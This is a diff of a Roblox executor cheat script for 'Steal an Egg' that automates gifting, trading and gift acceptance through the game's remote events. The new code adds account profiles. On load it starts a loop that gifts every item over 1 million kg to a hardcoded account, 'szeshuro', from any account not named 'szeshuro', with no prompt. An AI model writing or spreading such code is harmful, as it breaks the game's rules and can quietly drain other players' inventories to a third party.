@@ -2,8 +2,87 @@
 -- STEAL AN EGG - AUTO TRADE & GIFTING SYSTEM (SIGMA UI V4)
 -- Game: Steal an Egg (Roblox)
 -- Framework: Sigma UI Library - V4 Ultimate Edition
--- Features: Auto Gifting, Backpack Scanner, Filtered Trade, Auto Accept
+-- Features: Auto Gifting, Backpack Scanner, Filtered Trade, Auto Accept, Per-Player Config
 -- ==========================================================
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualUser = game:GetService("VirtualUser")
+local LocalPlayer = Players.LocalPlayer
+
+-- ==========================================================
+-- 👤 [KONFIGURASI PER-PLAYER / PROFIL AKUN]
+-- Pengaturan otomatis disesuaikan berdasarkan Username akun yang sedang login!
+-- ==========================================================
+local ACCOUNT_PROFILES = {
+    -- [PROFIL 1] Khusus untuk akun "szeshuro" (Receiver / Penerima)
+    -- Fitur yang aktif HANYA Auto Accept Gift saja
+    ["szeshuro"] = {
+        Role                = "Receiver (Hanya Auto Accept)",
+        AutoAcceptGift      = true,             -- true = Otomatis aktifkan Auto Accept Gift
+        OnlyAcceptTarget    = false,            -- false = Terima gift dari siapa saja
+        AcceptDelay         = 0.1,              -- Jeda waktu sebelum respon accept (detik)
+        AutoTradeLoop       = false,            -- false = Matikan trade sending
+        AutoTradeFilterLoop = false,            -- false = Matikan filter trade sending
+    },
+    
+    -- [PROFIL 2] Profil Default / Pengirim (Sender untuk akun lain / Alt)
+    ["DEFAULT"] = {
+        Role                = "Sender (Pengirim ke szeshuro)",
+        TargetUsername      = "szeshuro",       -- Otomatis kirim ke akun szeshuro
+        TargetPlayerId      = nil,              -- Diisi otomatis lewat auto-resolve
+        AutoTradeLoop       = false,            -- Trade semua tool
+        AutoTradeFilterLoop = true,             -- true = Langsung jalankan Trade By Filter
+        DelayBetweenGifts   = 0.5,              -- Jeda antar gift (detik)
+        FilterItem          = "All Items",      -- Filter jenis item
+        FilterMutation      = "All Mutations",  -- Filter mutasi
+        MinWeightInMillions = 1,                -- Minimal 1.000.000 kg (1 Juta kg)
+        MaxWeightInMillions = 0,                -- Tanpa batas maksimal
+        IgnoreFavorites     = false,            -- Jangan abaikan barang favorit
+        OnlyFavorites       = false,            -- Jangan batasi hanya favorit
+        AutoAcceptGift      = false,            -- Matikan auto accept di akun pengirim
+    }
+}
+
+-- ==========================================================
+-- 🔍 DETEKSI AKUN AKTIF & LOAD PROFILE
+-- ==========================================================
+local currentUsername = LocalPlayer and LocalPlayer.Name or ""
+local activeProfile = nil
+
+-- Cari profil yang cocok dengan nama akun (case-insensitive)
+for nameKey, profileData in pairs(ACCOUNT_PROFILES) do
+    if nameKey ~= "DEFAULT" and currentUsername:lower() == nameKey:lower() then
+        activeProfile = profileData
+        print(string.format("[StealAnEgg] Profil Khusus Terdeteksi: '%s' -> Role: %s", currentUsername, profileData.Role or "Custom"))
+        break
+    end
+end
+
+-- Jika tidak ada profil khusus, gunakan DEFAULT
+if not activeProfile then
+    activeProfile = ACCOUNT_PROFILES["DEFAULT"] or {}
+    print(string.format("[StealAnEgg] Profil Default Diterapkan untuk akun '%s' -> Role: %s", currentUsername, activeProfile.Role or "Default"))
+end
+
+local SCRIPT_CONFIG = {
+    TargetPlayerId      = activeProfile.TargetPlayerId,
+    TargetUsername      = activeProfile.TargetUsername or "",
+    AutoTradeLoop       = activeProfile.AutoTradeLoop or false,
+    AutoTradeFilterLoop = activeProfile.AutoTradeFilterLoop or false,
+    DelayBetweenGifts   = activeProfile.DelayBetweenGifts or 0.5,
+    AutoAcceptGift      = activeProfile.AutoAcceptGift or false,
+    OnlyAcceptTarget    = activeProfile.OnlyAcceptTarget or false,
+    AcceptDelay         = activeProfile.AcceptDelay or 0.1,
+    FilterItem          = activeProfile.FilterItem or "All Items",
+    FilterMutation      = activeProfile.FilterMutation or "All Mutations",
+    MinWeightInMillions = activeProfile.MinWeightInMillions or 0,
+    MaxWeightInMillions = activeProfile.MaxWeightInMillions or 0,
+    IgnoreFavorites     = activeProfile.IgnoreFavorites == true,
+    OnlyFavorites       = activeProfile.OnlyFavorites == true,
+    ProfileRole         = activeProfile.Role or "Normal"
+}
+
 
 -- =========================================================
 -- CLEANUP THREAD & UI LAMA
@@ -13,11 +92,6 @@ if getgenv().CancelStealAnEggTrade then
 end
 local scriptId = tick()
 getgenv().CurrentTradeScriptID = scriptId
-
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualUser = game:GetService("VirtualUser")
-local LocalPlayer = Players.LocalPlayer
 
 -- Built-in Anti-AFK System
 LocalPlayer.Idled:Connect(function()
@@ -39,8 +113,76 @@ local function formatNumber(n)
     return formatted
 end
 
+
 -- ==========================================================
--- [SECTION 1] PURE FUNCTIONS (Fungsi Modular & Backend)
+-- [SECTION 1] STATE & BACKEND CONFIGURATION
+-- ==========================================================
+
+local Config = {
+    TargetPlayerId      = SCRIPT_CONFIG.TargetPlayerId,
+    TargetPlayerName    = SCRIPT_CONFIG.TargetUsername or "",
+    AutoTradeLoop       = SCRIPT_CONFIG.AutoTradeLoop or false,
+    AutoTradeFilterLoop = SCRIPT_CONFIG.AutoTradeFilterLoop or false,
+    AutoAcceptGift      = SCRIPT_CONFIG.AutoAcceptGift or false,
+    OnlyAcceptTarget    = SCRIPT_CONFIG.OnlyAcceptTarget or false,
+    AcceptDelay         = SCRIPT_CONFIG.AcceptDelay or 0.1,
+    IgnoreFavorites     = SCRIPT_CONFIG.IgnoreFavorites,
+    OnlyFavorites       = SCRIPT_CONFIG.OnlyFavorites,
+    DelayBetweenGifts   = SCRIPT_CONFIG.DelayBetweenGifts or 0.5,
+    FilterItem          = SCRIPT_CONFIG.FilterItem or "All Items",
+    FilterMutation      = SCRIPT_CONFIG.FilterMutation or "All Mutations",
+    MinWeight           = (tonumber(SCRIPT_CONFIG.MinWeightInMillions) or 0) * 1000000,
+    MaxWeight           = (tonumber(SCRIPT_CONFIG.MaxWeightInMillions) or 0) * 1000000,
+    SelectedInvTool     = nil,
+    ProfileRole         = SCRIPT_CONFIG.ProfileRole
+}
+
+local TradeStats = {
+    TotalSent = 0,
+    SuccessCount = 0,
+    FailCount = 0,
+    AcceptedCount = 0,
+    LastItemName = "-"
+}
+
+local LastGiftRequest = {
+    SenderName = "-",
+    SenderId = nil,
+    ItemName = "-",
+    RequestUID = nil,
+    Time = 0
+}
+
+-- Otomatis resolve Target Username ke UserID jika diisi
+if Config.TargetPlayerName and Config.TargetPlayerName ~= "" and not Config.TargetPlayerId then
+    task.spawn(function()
+        pcall(function()
+            local found = Players:FindFirstChild(Config.TargetPlayerName)
+            if found then
+                Config.TargetPlayerId = found.UserId
+            else
+                local id = Players:GetUserIdFromNameAsync(Config.TargetPlayerName)
+                if id then
+                    Config.TargetPlayerId = id
+                end
+            end
+            if Config.TargetPlayerId then
+                print(string.format("[StealAnEgg] Auto-resolved Target '%s' -> UserID: %d", Config.TargetPlayerName, Config.TargetPlayerId))
+            end
+        end)
+    end)
+end
+
+-- Cleanup handler
+getgenv().CancelStealAnEggTrade = function()
+    Config.AutoTradeLoop = false
+    Config.AutoTradeFilterLoop = false
+    Config.AutoAcceptGift = false
+end
+
+
+-- ==========================================================
+-- [SECTION 2] PURE FUNCTIONS & PROGRAMMATIC API
 -- ==========================================================
 
 local StealAnEggTrade = {}
@@ -73,8 +215,6 @@ function StealAnEggTrade.GetGiftingRequestRemote()
 end
 
 --- Memegang / Equip Tool ke Character Player
--- @param tool Instance Tool yang ingin dipegang
--- @return boolean (success), string (message)
 function StealAnEggTrade.EquipTool(tool)
     if not tool or not tool:IsA("Tool") then 
         return false, "Objek yang diberikan bukan Tool" 
@@ -83,12 +223,10 @@ function StealAnEggTrade.EquipTool(tool)
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     
-    -- Sudah dipegang di Character
     if tool.Parent == character then
         return true, "Tool sudah dipegang"
     end
     
-    -- Equip dari Backpack ke Character
     if humanoid and tool.Parent == LocalPlayer:FindFirstChild("Backpack") then
         humanoid:EquipTool(tool)
         task.wait(0.25)
@@ -101,8 +239,6 @@ function StealAnEggTrade.EquipTool(tool)
 end
 
 --- Mengambil informasi Attributes dan Properties dari Tool
--- @param tool Instance Tool
--- @return table Info data tool
 function StealAnEggTrade.GetToolInfo(tool)
     if not tool or not tool:IsA("Tool") then return nil end
     local name = tool.Name
@@ -171,7 +307,6 @@ function StealAnEggTrade.ScanInventory()
                 favoriteCount = favoriteCount + 1
             end
             
-            -- Group by DisplayName
             local groupKey = info.DisplayName
             if not itemsByName[groupKey] then
                 itemsByName[groupKey] = {
@@ -183,7 +318,6 @@ function StealAnEggTrade.ScanInventory()
             itemsByName[groupKey].Count = itemsByName[groupKey].Count + 1
             table.insert(itemsByName[groupKey].Items, tool)
             
-            -- Track Mutations
             if info.BaseMutation and not mutationSet[info.BaseMutation] then
                 mutationSet[info.BaseMutation] = true
                 table.insert(mutations, info.BaseMutation)
@@ -212,11 +346,11 @@ end
 
 --- Memeriksa apakah suatu Tool cocok dengan kriteria filter
 function StealAnEggTrade.MatchesFilter(tool, filterConfig)
+    filterConfig = filterConfig or Config
     if not tool or not tool:IsA("Tool") then return false end
     local info = StealAnEggTrade.GetToolInfo(tool)
     if not info then return false end
     
-    -- Filter Favorite
     if filterConfig.IgnoreFavorites and info.Favorite then
         return false
     end
@@ -224,7 +358,6 @@ function StealAnEggTrade.MatchesFilter(tool, filterConfig)
         return false
     end
     
-    -- Filter Nama / DisplayName / Category
     if filterConfig.FilterItem and filterConfig.FilterItem ~= "All Items" and filterConfig.FilterItem ~= "" then
         local targetName = filterConfig.FilterItem:lower()
         local matchesName = info.Name:lower():find(targetName, 1, true) ~= nil
@@ -235,21 +368,18 @@ function StealAnEggTrade.MatchesFilter(tool, filterConfig)
         end
     end
     
-    -- Filter Mutation
     if filterConfig.FilterMutation and filterConfig.FilterMutation ~= "All Mutations" and filterConfig.FilterMutation ~= "All" then
         if info.BaseMutation:lower() ~= filterConfig.FilterMutation:lower() then
             return false
         end
     end
     
-    -- Filter Minimum Weight (dalam kg sebenarnya)
     if filterConfig.MinWeight and filterConfig.MinWeight > 0 then
         if info.Weight < filterConfig.MinWeight then
             return false
         end
     end
     
-    -- Filter Maximum Weight (dalam kg sebenarnya)
     if filterConfig.MaxWeight and filterConfig.MaxWeight > 0 then
         if info.Weight > filterConfig.MaxWeight then
             return false
@@ -260,15 +390,12 @@ function StealAnEggTrade.MatchesFilter(tool, filterConfig)
 end
 
 --- Mengirim Gift Tool ke Player Target
--- @param targetPlayerId UserID player penerima
--- @param tool (Optional) Tool yang akan di-gift. Jika nil, mengambil yang sedang dipegang
--- @return boolean (success), any (result/error)
 function StealAnEggTrade.SendGift(targetPlayerId, tool)
+    targetPlayerId = targetPlayerId or Config.TargetPlayerId
     if not targetPlayerId then
         return false, "Target Player ID (UserId) belum ditentukan!"
     end
     
-    -- Jika tool nil, cari Tool yang sedang dipegang di Character
     if not tool then
         local character = LocalPlayer.Character
         if character then
@@ -280,22 +407,18 @@ function StealAnEggTrade.SendGift(targetPlayerId, tool)
         return false, "Tidak ada Tool yang dipegang / ditemukan!"
     end
     
-    -- 1. Pegang barangnya terlebih dahulu
     local equipped, equipMsg = StealAnEggTrade.EquipTool(tool)
     if not equipped then
         return false, "Gagal memegang Tool: " .. tostring(equipMsg)
     end
     
-    -- Jeda singkat agar server menyinkronkan Tool yang sedang dipegang
     task.wait(0.15)
     
-    -- 2. Dapatkan RemoteFunction Gifting
     local giftingRemote = StealAnEggTrade.GetGiftingRemote()
     if not giftingRemote then
         return false, "Remote 'Gifting: Send Request' tidak ditemukan di ReplicatedStorage.Network"
     end
     
-    -- 3. InvokeServer ke remote game
     local numericId = tonumber(targetPlayerId) or targetPlayerId
     local success, result = pcall(function()
         return giftingRemote:InvokeServer(numericId)
@@ -309,9 +432,6 @@ function StealAnEggTrade.SendGift(targetPlayerId, tool)
 end
 
 --- Menerima (Accept) Permintaan Gift yang Masuk
--- @param senderUserId UserID player pengirim gift (Arg 2 dari Gifting: Request)
--- @param requestUid UID dari gift request yang diterima (Arg 4 dari Gifting: Request)
--- @return boolean (success), any (result/error)
 function StealAnEggTrade.AcceptGift(senderUserId, requestUid)
     local responseRemote = StealAnEggTrade.GetGiftingResponseRemote()
     if not responseRemote then
@@ -345,13 +465,291 @@ function StealAnEggTrade.DeclineGift(senderUserId, requestUid)
     return success, result
 end
 
+
+-- ==========================================================
+-- 🎮 PROGRAMMATIC SCRIPT CONTROLLERS (API)
+-- ==========================================================
+
+function StealAnEggTrade.SetTarget(targetUserIdOrUsername)
+    local num = tonumber(targetUserIdOrUsername)
+    if num then
+        Config.TargetPlayerId = num
+        print("[StealAnEgg API] Target UserId diset ke:", num)
+        return true, num
+    elseif type(targetUserIdOrUsername) == "string" and targetUserIdOrUsername ~= "" then
+        local foundPlayer = Players:FindFirstChild(targetUserIdOrUsername)
+        if foundPlayer then
+            Config.TargetPlayerId = foundPlayer.UserId
+            print(string.format("[StealAnEgg API] Target Player '%s' -> UserID: %d", targetUserIdOrUsername, foundPlayer.UserId))
+            return true, foundPlayer.UserId
+        else
+            local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(targetUserIdOrUsername) end)
+            if ok and id then
+                Config.TargetPlayerId = id
+                print(string.format("[StealAnEgg API] Target Player '%s' -> UserID: %d", targetUserIdOrUsername, id))
+                return true, id
+            end
+        end
+    end
+    return false, "Player tidak ditemukan"
+end
+
+function StealAnEggTrade.SetAutoTrade(state)
+    Config.AutoTradeLoop = (state == true)
+    print("[StealAnEgg API] AutoTradeLoop set to:", Config.AutoTradeLoop)
+    if Config.AutoTradeLoop then
+        StealAnEggTrade.StartAutoTradeLoop()
+    end
+end
+
+function StealAnEggTrade.SetAutoTradeFilter(state)
+    Config.AutoTradeFilterLoop = (state == true)
+    print("[StealAnEgg API] AutoTradeFilterLoop set to:", Config.AutoTradeFilterLoop)
+    if Config.AutoTradeFilterLoop then
+        StealAnEggTrade.StartFilteredTradeLoop()
+    end
+end
+
+function StealAnEggTrade.SetAutoAccept(state)
+    Config.AutoAcceptGift = (state == true)
+    print("[StealAnEgg API] AutoAcceptGift set to:", Config.AutoAcceptGift)
+end
+
+function StealAnEggTrade.SetFilter(filterTbl)
+    if type(filterTbl) ~= "table" then return false end
+    if filterTbl.Item then Config.FilterItem = filterTbl.Item end
+    if filterTbl.Mutation then Config.FilterMutation = filterTbl.Mutation end
+    if filterTbl.MinWeightMillions then Config.MinWeight = filterTbl.MinWeightMillions * 1000000 end
+    if filterTbl.MinWeight then Config.MinWeight = filterTbl.MinWeight end
+    if filterTbl.MaxWeightMillions then Config.MaxWeight = filterTbl.MaxWeightMillions * 1000000 end
+    if filterTbl.MaxWeight then Config.MaxWeight = filterTbl.MaxWeight end
+    if filterTbl.IgnoreFavorites ~= nil then Config.IgnoreFavorites = filterTbl.IgnoreFavorites end
+    if filterTbl.OnlyFavorites ~= nil then Config.OnlyFavorites = filterTbl.OnlyFavorites end
+    print(string.format("[StealAnEgg API] Filter Updated -> Item: %s | Mutasi: %s | Min: %.2f Juta kg", tostring(Config.FilterItem), tostring(Config.FilterMutation), Config.MinWeight / 1000000))
+    return true
+end
+
+function StealAnEggTrade.GiftFilteredBatch()
+    if not Config.TargetPlayerId then
+        warn("[StealAnEgg API] Target Player belum diset!")
+        return false, "Target Player belum diset"
+    end
+    local tools = StealAnEggTrade.GetAllTools()
+    local matched = {}
+    for _, t in ipairs(tools) do
+        if StealAnEggTrade.MatchesFilter(t, Config) then
+            table.insert(matched, t)
+        end
+    end
+    task.spawn(function()
+        for _, tool in ipairs(matched) do
+            if not tool.Parent then continue end
+            local tName = tool.Name
+            local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
+            if ok then
+                TradeStats.TotalSent = TradeStats.TotalSent + 1
+                TradeStats.SuccessCount = TradeStats.SuccessCount + 1
+                TradeStats.LastItemName = tName
+            else
+                TradeStats.FailCount = TradeStats.FailCount + 1
+            end
+            task.wait(Config.DelayBetweenGifts)
+        end
+    end)
+    return true, #matched
+end
+
+function StealAnEggTrade.GetStats()
+    return TradeStats
+end
+
+function StealAnEggTrade.GetConfig()
+    return Config
+end
+
 -- Export global
 _G.StealAnEggTrade = StealAnEggTrade
 getgenv().StealAnEggTrade = StealAnEggTrade
 
 
 -- ==========================================================
--- [SECTION 2] LOAD SIGMA UI LIBRARY V4
+-- [SECTION 3] AUTO ACCEPT LISTENER (EXACT EVENT HANDLER)
+-- Signature: Gifting: Request -> OnClientEvent(username, userId, itemName, requestUID)
+-- ==========================================================
+
+local LastRequestPara = nil
+
+function StealAnEggTrade.OnGiftRequestReceived(senderUsername, senderUserId, itemName, requestUID)
+    local sName = tostring(senderUsername or "Unknown")
+    local sId = tonumber(senderUserId)
+    local iName = tostring(itemName or "Unknown Item")
+    local reqUid = tostring(requestUID or "")
+    
+    LastGiftRequest.SenderName = sName
+    LastGiftRequest.SenderId = sId
+    LastGiftRequest.ItemName = iName
+    LastGiftRequest.RequestUID = reqUid
+    LastGiftRequest.Time = tick()
+    
+    print(string.format("[AutoAccept] Event Masuk: %s (ID: %s) mengirim '%s' [UID: %s]", sName, tostring(sId), iName, reqUid))
+    
+    if LastRequestPara then
+        pcall(function()
+            LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: Menunggu Respon...", iName, sName, tostring(sId)))
+        end)
+    end
+    
+    if Config.AutoAcceptGift then
+        if Config.OnlyAcceptTarget and Config.TargetPlayerId then
+            if sId ~= tonumber(Config.TargetPlayerId) then
+                if LastRequestPara then
+                    pcall(function()
+                        LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: Diabaikan (Bukan Target Whitelist) ❌", iName, sName, tostring(sId)))
+                    end)
+                end
+                return
+            end
+        end
+        
+        if Config.AcceptDelay and Config.AcceptDelay > 0 then
+            task.wait(Config.AcceptDelay)
+        end
+        
+        local ok, result = StealAnEggTrade.AcceptGift(sId, reqUid)
+        if ok then
+            TradeStats.AcceptedCount = TradeStats.AcceptedCount + 1
+            if LastRequestPara then
+                pcall(function()
+                    LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: BERHASIL DITERIMA ✅", iName, sName, tostring(sId)))
+                end)
+            end
+            pcall(function()
+                Library:Notify({
+                    Title   = "Gift Diterima! 📥",
+                    Content = string.format("Menerima '%s' dari %s", iName, sName),
+                    Type    = "Success",
+                    Duration = 3.5
+                })
+            end)
+        else
+            if LastRequestPara then
+                pcall(function()
+                    LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s\nStatus: GAGAL DITERIMA ❌ (%s)", iName, sName, tostring(result)))
+                end)
+            end
+            pcall(function()
+                Library:Notify({
+                    Title   = "Gagal Menerima Gift",
+                    Content = "Error: " .. tostring(result),
+                    Type    = "Error",
+                    Duration = 3.5
+                })
+            end)
+        end
+    end
+end
+
+-- Listener pada ReplicatedStorage.Network["Gifting: Request"]
+task.spawn(function()
+    local network = ReplicatedStorage:WaitForChild("Network", 10)
+    if not network then return end
+    
+    local giftingReq = network:FindFirstChild("Gifting: Request") or network:WaitForChild("Gifting: Request", 5)
+    if giftingReq and giftingReq:IsA("RemoteEvent") then
+        giftingReq.OnClientEvent:Connect(function(senderUsername, senderUserId, itemName, requestUID)
+            task.spawn(StealAnEggTrade.OnGiftRequestReceived, senderUsername, senderUserId, itemName, requestUID)
+        end)
+    end
+    
+    network.ChildAdded:Connect(function(child)
+        if child.Name == "Gifting: Request" and child:IsA("RemoteEvent") then
+            child.OnClientEvent:Connect(function(senderUsername, senderUserId, itemName, requestUID)
+                task.spawn(StealAnEggTrade.OnGiftRequestReceived, senderUsername, senderUserId, itemName, requestUID)
+            end)
+        end
+    end)
+end)
+
+
+-- ==========================================================
+-- [SECTION 4] BACKGROUND LOOPS MANAGER
+-- ==========================================================
+
+local isTradeLoopRunning = false
+function StealAnEggTrade.StartAutoTradeLoop()
+    if isTradeLoopRunning then return end
+    isTradeLoopRunning = true
+    task.spawn(function()
+        while Config.AutoTradeLoop and getgenv().CurrentTradeScriptID == scriptId do
+            if Config.TargetPlayerId then
+                local tools = StealAnEggTrade.GetAllTools()
+                for _, tool in ipairs(tools) do
+                    if not Config.AutoTradeLoop then break end
+                    
+                    if Config.IgnoreFavorites and tool:GetAttribute("Favorite") == true then
+                        continue
+                    end
+                    
+                    local tName = tool.Name
+                    local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
+                    if ok then
+                        TradeStats.TotalSent = TradeStats.TotalSent + 1
+                        TradeStats.SuccessCount = TradeStats.SuccessCount + 1
+                        TradeStats.LastItemName = tName
+                    else
+                        TradeStats.FailCount = TradeStats.FailCount + 1
+                    end
+                    task.wait(Config.DelayBetweenGifts)
+                end
+            end
+            task.wait(0.5)
+        end
+        isTradeLoopRunning = false
+    end)
+end
+
+local isFilterLoopRunning = false
+function StealAnEggTrade.StartFilteredTradeLoop()
+    if isFilterLoopRunning then return end
+    isFilterLoopRunning = true
+    task.spawn(function()
+        while Config.AutoTradeFilterLoop and getgenv().CurrentTradeScriptID == scriptId do
+            if Config.TargetPlayerId then
+                local tools = StealAnEggTrade.GetAllTools()
+                for _, tool in ipairs(tools) do
+                    if not Config.AutoTradeFilterLoop then break end
+                    
+                    if StealAnEggTrade.MatchesFilter(tool, Config) then
+                        local tName = tool.Name
+                        local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
+                        if ok then
+                            TradeStats.TotalSent = TradeStats.TotalSent + 1
+                            TradeStats.SuccessCount = TradeStats.SuccessCount + 1
+                            TradeStats.LastItemName = tName
+                        else
+                            TradeStats.FailCount = TradeStats.FailCount + 1
+                        end
+                        task.wait(Config.DelayBetweenGifts)
+                    end
+                end
+            end
+            task.wait(0.5)
+        end
+        isFilterLoopRunning = false
+    end)
+end
+
+-- Jalankan loop otomatis jika diaktifkan di Profile
+if Config.AutoTradeLoop then
+    StealAnEggTrade.StartAutoTradeLoop()
+end
+if Config.AutoTradeFilterLoop then
+    StealAnEggTrade.StartFilteredTradeLoop()
+end
+
+
+-- ==========================================================
+-- [SECTION 5] LOAD SIGMA UI LIBRARY V4
 -- ==========================================================
 
 local Library = nil
@@ -369,48 +767,6 @@ end
 
 if not Library then
     error("Gagal memuat Sigma UI Library! Pastikan executor Anda terhubung ke internet.")
-end
-
--- State & Konfigurasi Global
-local Config = {
-    TargetPlayerId = nil,
-    AutoTradeLoop = false,
-    AutoTradeFilterLoop = false,
-    AutoAcceptGift = false,
-    OnlyAcceptTarget = false,
-    AcceptDelay = 0.1,
-    IgnoreFavorites = true,
-    OnlyFavorites = false,
-    DelayBetweenGifts = 0.5,
-    FilterItem = "All Items",
-    FilterMutation = "All Mutations",
-    MinWeight = 0,
-    MaxWeight = 0,
-    QuantityLimit = 0,
-    SelectedInvTool = nil
-}
-
-local TradeStats = {
-    TotalSent = 0,
-    SuccessCount = 0,
-    FailCount = 0,
-    AcceptedCount = 0,
-    LastItemName = "-"
-}
-
-local LastGiftRequest = {
-    SenderName = "-",
-    SenderId = nil,
-    ItemName = "-",
-    RequestUID = nil,
-    Time = 0
-}
-
--- Cleanup handler
-getgenv().CancelStealAnEggTrade = function()
-    Config.AutoTradeLoop = false
-    Config.AutoTradeFilterLoop = false
-    Config.AutoAcceptGift = false
 end
 
 -- Helper Player List
@@ -443,142 +799,11 @@ end
 
 
 -- ==========================================================
--- [SECTION 3] AUTO ACCEPT LISTENER (EXACT EVENT HANDLER)
--- Signature: Gifting: Request -> OnClientEvent(username, userId, itemName, requestUID)
--- ==========================================================
-
-local LastRequestPara = nil
-
---- Handler yang dipanggil saat ada event "Gifting: Request" masuk
-function StealAnEggTrade.OnGiftRequestReceived(senderUsername, senderUserId, itemName, requestUID)
-    local sName = tostring(senderUsername or "Unknown")
-    local sId = tonumber(senderUserId)
-    local iName = tostring(itemName or "Unknown Item")
-    local reqUid = tostring(requestUID or "")
-    
-    LastGiftRequest.SenderName = sName
-    LastGiftRequest.SenderId = sId
-    LastGiftRequest.ItemName = iName
-    LastGiftRequest.RequestUID = reqUid
-    LastGiftRequest.Time = tick()
-    
-    print(string.format("[AutoAccept] Event Masuk: %s (ID: %s) mengirim '%s' [UID: %s]", sName, tostring(sId), iName, reqUid))
-    
-    if LastRequestPara then
-        LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: Menunggu Respon...", iName, sName, tostring(sId)))
-    end
-    
-    -- Eksekusi jika Auto Accept diaktifkan
-    if Config.AutoAcceptGift then
-        -- Cek Whitelist Target jika opsi aktif
-        if Config.OnlyAcceptTarget and Config.TargetPlayerId then
-            if sId ~= tonumber(Config.TargetPlayerId) then
-                if LastRequestPara then
-                    LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: Diabaikan (Bukan Target Whitelist) ❌", iName, sName, tostring(sId)))
-                end
-                return
-            end
-        end
-        
-        -- Tunggu jeda (delay) jika disetel
-        if Config.AcceptDelay and Config.AcceptDelay > 0 then
-            task.wait(Config.AcceptDelay)
-        end
-        
-        -- Kirim respon Accept ke server
-        local ok, result = StealAnEggTrade.AcceptGift(sId, reqUid)
-        if ok then
-            TradeStats.AcceptedCount = TradeStats.AcceptedCount + 1
-            if LastRequestPara then
-                LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s (ID: %s)\nStatus: BERHASIL DITERIMA ✅", iName, sName, tostring(sId)))
-            end
-            Library:Notify({
-                Title   = "Gift Diterima! 📥",
-                Content = string.format("Menerima '%s' dari %s", iName, sName),
-                Type    = "Success",
-                Duration = 3.5
-            })
-        else
-            if LastRequestPara then
-                LastRequestPara:Set("Permintaan Masuk Terakhir", string.format("Item: %s\nDari: %s\nStatus: GAGAL DITERIMA ❌ (%s)", iName, sName, tostring(result)))
-            end
-            Library:Notify({
-                Title   = "Gagal Menerima Gift",
-                Content = "Error: " .. tostring(result),
-                Type    = "Error",
-                Duration = 3.5
-            })
-        end
-    end
-end
-
--- Listener pada ReplicatedStorage.Network["Gifting: Request"]
-task.spawn(function()
-    local network = ReplicatedStorage:WaitForChild("Network", 10)
-    if not network then return end
-    
-    local giftingReq = network:FindFirstChild("Gifting: Request") or network:WaitForChild("Gifting: Request", 5)
-    if giftingReq and giftingReq:IsA("RemoteEvent") then
-        giftingReq.OnClientEvent:Connect(function(senderUsername, senderUserId, itemName, requestUID)
-            task.spawn(StealAnEggTrade.OnGiftRequestReceived, senderUsername, senderUserId, itemName, requestUID)
-        end)
-    end
-    
-    -- Listener backup untuk mendeteksi jika ada RemoteEvent baru yang ditambahkan
-    network.ChildAdded:Connect(function(child)
-        if child.Name == "Gifting: Request" and child:IsA("RemoteEvent") then
-            child.OnClientEvent:Connect(function(senderUsername, senderUserId, itemName, requestUID)
-                task.spawn(StealAnEggTrade.OnGiftRequestReceived, senderUsername, senderUserId, itemName, requestUID)
-            end)
-        end
-    end)
-end)
-
--- Listener GUI Dialog Prompt Scanner di PlayerGui (Backup jika game memunculkan tombol Accept)
-task.spawn(function()
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
-    if not playerGui then return end
-    
-    local function checkAndClickAcceptButton(descendant)
-        if not Config.AutoAcceptGift then return end
-        if descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
-            local btnName = descendant.Name:lower()
-            local btnText = (descendant:IsA("TextButton") and descendant.Text:lower()) or ""
-            
-            local isAccept = btnName:find("accept") or btnName:find("terima") or btnName:find("confirm") 
-                          or btnText:find("accept") or btnText:find("terima") or btnText:find("yes")
-            
-            if isAccept then
-                local p = descendant.Parent
-                local pName = p and p.Name:lower() or ""
-                local gpName = p and p.Parent and p.Parent.Name:lower() or ""
-                
-                if pName:find("gift") or gpName:find("gift") or pName:find("trade") or gpName:find("trade") or pName:find("prompt") then
-                    task.wait(Config.AcceptDelay or 0.1)
-                    pcall(function()
-                        if firesignal then
-                            firesignal(descendant.MouseButton1Click)
-                        elseif getconnections then
-                            for _, c in ipairs(getconnections(descendant.MouseButton1Click)) do
-                                c:Fire()
-                            end
-                        end
-                    end)
-                end
-            end
-        end
-    end
-    
-    playerGui.DescendantAdded:Connect(checkAndClickAcceptButton)
-end)
-
-
--- ==========================================================
--- [SECTION 4] MEMBUAT WINDOW & KOMPONEN SIGMA UI
+-- [SECTION 6] MEMBUAT WINDOW & KOMPONEN SIGMA UI
 -- ==========================================================
 
 local Window = Library:CreateWindow({
-    Name       = 'Sigma Hub | Steal An Egg Auto Trade',
+    Name       = string.format("Sigma Hub | Steal An Egg (%s)", Config.ProfileRole or currentUsername),
     Footer     = 'discord.gg/sigma | v4.0',
     LogoText   = '🥚',
     ConfigName = 'SigmaHub_StealAnEgg',
@@ -630,39 +855,25 @@ end)
 
 TargetSec:AddInput({
     Name = "✏️ Input Manual UserID / Username",
-    Placeholder = "Masukkan UserID (cth: 12345678) atau Username",
+    Placeholder = Config.TargetPlayerId and tostring(Config.TargetPlayerId) or (Config.TargetPlayerName ~= "" and Config.TargetPlayerName or "Masukkan UserID atau Username"),
     Tooltip = "Ketik UserID angka atau Username target langsung"
 }, function(text)
     if text and text ~= "" then
-        local num = tonumber(text)
-        if num then
-            Config.TargetPlayerId = num
+        local ok, res = StealAnEggTrade.SetTarget(text)
+        if ok then
             Library:Notify({
-                Title   = "Target UserID",
-                Content = "UserID diset ke: " .. num,
+                Title   = "Target Diset",
